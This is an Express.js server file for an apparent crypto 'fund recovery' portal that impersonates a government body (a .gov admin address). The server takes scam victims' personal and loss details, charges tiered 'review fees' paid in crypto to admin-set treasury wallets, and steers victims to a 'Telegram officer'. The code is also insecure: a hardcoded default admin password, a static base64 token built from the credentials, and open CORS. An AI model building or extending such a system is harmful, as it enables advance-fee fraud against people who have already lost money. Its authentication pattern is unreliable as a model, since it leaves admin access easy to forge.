import express from 'express'
import cors from 'cors'
import bcrypt from 'bcryptjs'
import dotenv from 'dotenv'
import { v4 as uuidv4 } from 'uuid'
import db from './db.js'

dotenv.config()

const app = express()
const port = Number(process.env.PORT || 8787)
const adminEmail = process.env.ADMIN_EMAIL || 'admin@libertyforward.gov'
const adminPassword = process.env.ADMIN_PASSWORD || 'liberty2024'

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*')
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS')
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization')

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204)
  }

  return next()
})

app.use(
  cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  }),
)
app.options('*', (_req, res) => res.sendStatus(204))
app.use(express.json({ limit: '2mb' }))

function createToken() {
  return Buffer.from(`${adminEmail}:${adminPassword}`).toString('base64')
}

function isAdmin(req) {
  return req.headers.authorization === `Bearer ${createToken()}`
}

function requireAdmin(req, res, next) {
  if (!isAdmin(req)) {
    return res.status(401).json({ ok: false, message: 'Unauthorized' })
  }
  return next()
}

function mapWallet(row) {
  return {
    id: row.wallet_key,
    name: row.name,
    asset: row.asset,
    network: row.network,
    address: row.address,
  }
}

function mapTier(row) {
  return {
    id: row.tier_key,
    name: row.name,
    level: row.level,
    fee: Number(row.fee),
    description: row.description,
  }
}

async function getPortalSettings() {
  try {
    const rows = await db.query(
      `SELECT setting_key, setting_value FROM portal_settings
       WHERE setting_key IN ('telegram_officer_url')`,
    )

    const map = Object.fromEntries(rows.map((row) => [row.setting_key, row.setting_value || '']))

    return {
      telegramUrl: map.telegram_officer_url || '',
    }
  } catch {
    return { telegramUrl: '' }
  }
}

function normalizeTelegramUrl(value) {
  const trimmed = String(value || '').trim()
  if (!trimmed) return ''

  if (/^https?:\/\//i.test(trimmed)) return trimmed
  if (trimmed.startsWith('t.me/')) return `https://${trimmed}`
  if (trimmed.startsWith('@')) return `https://t.me/${trimmed.slice(1)}`

  return `https://t.me/${trimmed.replace(/^@/, '')}`
}

function mapCase(row) {
  return {
    id: row.id,
    reference: row.reference,
    formId: row.form_id,
    name: row.name,
    email: row.email,
    phone: row.phone,
    contact: row.contact,
    country: row.country,
    stateRegion: row.state_region,
    city: row.city,
    scamType: row.scam_type,
    scamPlatform: row.scam_platform,
    contactMethod: row.contact_method,
    lockedLocation: row.locked_location,
    asset: row.asset,
    network: row.network,
    lockedAmount: row.locked_amount,
    totalLostUSD: row.total_lost_usd,
    incidentDate: row.incident_date,
    walletAddress: row.wallet_address,
    scammerAddress: row.scammer_address,
    transactionProof: row.transaction_proof,
    exchangeInvolved: row.exchange_involved,
    policeReport: row.police_report,
    scamDetails: row.scam_details,
    tierId: row.tier_key,
    tierName: row.tier_name,
    tierLevel: row.tier_level,
    feeAmount: Number(row.fee_amount),
    reviewFee: `$${Number(row.fee_amount).toLocaleString('en-US')}`,
    paymentWallet: row.payment_wallet_key,
    paymentWalletName: row.payment_wallet_name,
    paymentWalletAddress: row.payment_wallet_address,
    payingFrom: row.paying_from,
    paymentAsset: row.payment_asset,
    feeSpeed: row.fee_speed,
    paymentStatus: row.payment_status,
    paymentTxHash: row.payment_tx_hash,
    paymentSubmittedAt: row.payment_submitted_at,
    paidAt: row.paid_at,
    verifiedAt: row.verified_at,
    status: row.status,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  }
}

app.get('/api/health', async (_req, res) => {
  try {
    const status = await db.status()
    res.json({ ok: true, gateway: status })
  } catch (error) {
    res.status(503).json({ ok: false, error: error.message })
  }
})

app.get('/api/settings', async (_req, res) => {
  try {
    const wallets = await db.query('SELECT * FROM treasury_wallets ORDER BY id')
    const tiers = await db.query('SELECT * FROM service_tiers ORDER BY level')
    const portal = await getPortalSettings()
    res.json({
      ok: true,
      wallets: wallets.map(mapWallet),
      tiers: tiers.map(mapTier),
      portal,
    })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.post('/api/cases', async (req, res) => {
  try {
    const body = req.body
    const id = uuidv4()
    const reference = `LFC-${Date.now().toString().slice(-6)}`

    await db.execute(
      `INSERT INTO recovery_cases (
        id, reference, name, email, phone, contact, country, state_region, city,
        scam_type, scam_platform, contact_method, locked_location, asset, network,
        locked_amount, total_lost_usd, incident_date, wallet_address, scammer_address,
        transaction_proof, exchange_involved, police_report, scam_details,
        tier_key, tier_name, tier_level, fee_amount,
        payment_wallet_key, payment_wallet_name, payment_wallet_address,
        paying_from, payment_asset, fee_speed
      ) VALUES (
        ?, ?, ?, ?, ?, ?, ?, ?, ?,
        ?, ?, ?, ?, ?, ?,
        ?, ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?,
        ?, ?, ?
      )`,
      [
        id,
        reference,
        body.name,
        body.email,
        body.phone || null,
        body.contact || null,
        body.country,
        body.stateRegion || null,
        body.city || null,
        body.scamType,
        body.scamPlatform,
        body.contactMethod,
        body.lockedLocation,
        body.asset,
        body.network,
        body.lockedAmount,
        body.totalLostUSD,
        body.incidentDate,
        body.walletAddress,
        body.scammerAddress || null,
        body.transactionProof,
        body.exchangeInvolved || null,
        body.policeReport,
        body.scamDetails || null,
        body.tierId,
        body.tierName,
        body.tierLevel,
        body.feeAmount,
        body.paymentWallet,
        body.paymentWalletName,
        body.paymentWalletAddress,
        body.payingFrom || null,
        body.paymentAsset || null,
        body.feeSpeed || null,
      ],
    )

    const rows = await db.query('SELECT * FROM recovery_cases WHERE id = ?', [id])
    res.status(201).json({ ok: true, record: mapCase(rows[0]) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.get('/api/cases/:reference', async (req, res) => {
  try {
    const rows = await db.query(
      'SELECT * FROM recovery_cases WHERE reference = ?',
      [req.params.reference],
    )

    if (!rows.length) {
      return res.status(404).json({ ok: false, message: 'Case not found' })
    }

    res.json({ ok: true, record: mapCase(rows[0]) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.post('/api/cases/:reference/payment', async (req, res) => {
  try {
    const { paymentTxHash, payingFrom } = req.body

    if (!paymentTxHash?.trim()) {
      return res.status(400).json({ ok: false, message: 'Transaction hash is required' })
    }

    const rows = await db.query(
      'SELECT * FROM recovery_cases WHERE reference = ?',
      [req.params.reference],
    )

    if (!rows.length) {
      return res.status(404).json({ ok: false, message: 'Case not found' })
    }

    const current = rows[0]

    if (current.payment_status === 'paid' || current.payment_status === 'verified') {
      return res.json({ ok: true, record: mapCase(current), message: 'Payment already confirmed' })
    }

    await db.execute(
      `UPDATE recovery_cases
       SET payment_status = 'submitted',
           payment_tx_hash = ?,
           paying_from = COALESCE(?, paying_from),
           payment_submitted_at = NOW()
       WHERE reference = ?`,
      [paymentTxHash.trim(), payingFrom || null, req.params.reference],
    )

    const updated = await db.query(
      'SELECT * FROM recovery_cases WHERE reference = ?',
      [req.params.reference],
    )

    res.json({
      ok: true,
      record: mapCase(updated[0]),
      message: 'Payment submitted. Awaiting treasury confirmation.',
    })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body
    const rows = await db.query('SELECT * FROM admin_users WHERE email = ?', [email])

    if (!rows.length) {
      return res.status(401).json({ ok: false, message: 'Invalid admin login' })
    }

    const valid = await bcrypt.compare(password, rows[0].password_hash)

    if (!valid) {
      return res.status(401).json({ ok: false, message: 'Invalid admin login' })
    }

    res.json({ ok: true, token: createToken(), email })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.get('/api/admin/cases', requireAdmin, async (_req, res) => {
  try {
    const rows = await db.query('SELECT * FROM recovery_cases ORDER BY created_at DESC')
    res.json({ ok: true, records: rows.map(mapCase) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.patch('/api/admin/cases/:id/payment-status', requireAdmin, async (req, res) => {
  try {
    const { paymentStatus, clearPayment = false } = req.body
    const allowed = ['pending', 'submitted', 'paid', 'verified']

    if (!allowed.includes(paymentStatus)) {
      return res.status(400).json({ ok: false, message: 'Invalid payment status' })
    }

    await db.execute(
      `UPDATE recovery_cases
       SET payment_status = ?,
           paid_at = CASE
             WHEN ? IN ('paid', 'verified') THEN COALESCE(paid_at, NOW())
             ELSE NULL
           END,
           verified_at = CASE
             WHEN ? = 'verified' THEN COALESCE(verified_at, NOW())
             ELSE NULL
           END,
           payment_submitted_at = CASE
             WHEN ? = 1 THEN NULL
             ELSE payment_submitted_at
           END,
           payment_tx_hash = CASE
             WHEN ? = 1 THEN NULL
             ELSE payment_tx_hash
           END,
           paying_from = CASE
             WHEN ? = 1 THEN NULL
             ELSE paying_from
           END
       WHERE id = ?`,
      [
        paymentStatus,
        paymentStatus,
        paymentStatus,
        clearPayment ? 1 : 0,
        clearPayment ? 1 : 0,
        clearPayment ? 1 : 0,
        req.params.id,
      ],
    )

    const rows = await db.query('SELECT * FROM recovery_cases WHERE id = ?', [req.params.id])

    if (!rows.length) {
      return res.status(404).json({ ok: false, message: 'Case not found' })
    }

    res.json({ ok: true, record: mapCase(rows[0]) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.patch('/api/admin/cases/:id/payment-details', requireAdmin, async (req, res) => {
  try {
    const paymentTxHash = req.body.paymentTxHash?.trim() || null
    const payingFrom = req.body.payingFrom?.trim() || null

    if (!paymentTxHash && !payingFrom) {
      return res.status(400).json({ ok: false, message: 'Payment TXID or paying-from address is required' })
    }

    await db.execute(
      `UPDATE recovery_cases
       SET payment_tx_hash = COALESCE(?, payment_tx_hash),
           paying_from = COALESCE(?, paying_from),
           payment_submitted_at = CASE
             WHEN ? IS NOT NULL AND payment_submitted_at IS NULL THEN NOW()
             ELSE payment_submitted_at
           END
       WHERE id = ?`,
      [paymentTxHash, payingFrom, paymentTxHash, req.params.id],
    )

    const rows = await db.query('SELECT * FROM recovery_cases WHERE id = ?', [req.params.id])

    if (!rows.length) {
      return res.status(404).json({ ok: false, message: 'Case not found' })
    }

    res.json({ ok: true, record: mapCase(rows[0]) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.delete('/api/admin/cases/:id', requireAdmin, async (req, res) => {
  try {
    const rows = await db.query('SELECT id FROM recovery_cases WHERE id = ?', [req.params.id])

    if (!rows.length) {
      return res.status(404).json({ ok: false, message: 'Case not found' })
    }

    await db.execute('DELETE FROM recovery_cases WHERE id = ?', [req.params.id])

    res.json({ ok: true })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.put('/api/admin/wallets/:key', requireAdmin, async (req, res) => {
  try {
    const { name, asset, network, address } = req.body

    await db.execute(
      `UPDATE treasury_wallets
       SET name = ?, asset = ?, network = ?, address = ?
       WHERE wallet_key = ?`,
      [name, asset, network, address, req.params.key],
    )

    const rows = await db.query('SELECT * FROM treasury_wallets WHERE wallet_key = ?', [req.params.key])
    res.json({ ok: true, wallet: mapWallet(rows[0]) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.put('/api/admin/tiers/:key', requireAdmin, async (req, res) => {
  try {
    const { name, fee, description } = req.body

    await db.execute(
      `UPDATE service_tiers
       SET name = ?, fee = ?, description = ?
       WHERE tier_key = ?`,
      [name, fee, description, req.params.key],
    )

    const rows = await db.query('SELECT * FROM service_tiers WHERE tier_key = ?', [req.params.key])
    res.json({ ok: true, tier: mapTier(rows[0]) })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.put('/api/admin/portal-settings', requireAdmin, async (req, res) => {
  try {
    const telegramUrl = normalizeTelegramUrl(req.body.telegramUrl)

    await db.execute(
      `INSERT INTO portal_settings (setting_key, setting_value)
       VALUES ('telegram_officer_url', ?)
       ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value)`,
      [telegramUrl],
    )

    res.json({ ok: true, portal: { telegramUrl } })
  } catch (error) {
    res.status(500).json({ ok: false, message: error.message })
  }
})

app.listen(port, () => {
  console.log(`LFC API running on http://localhost:${port}`)
})
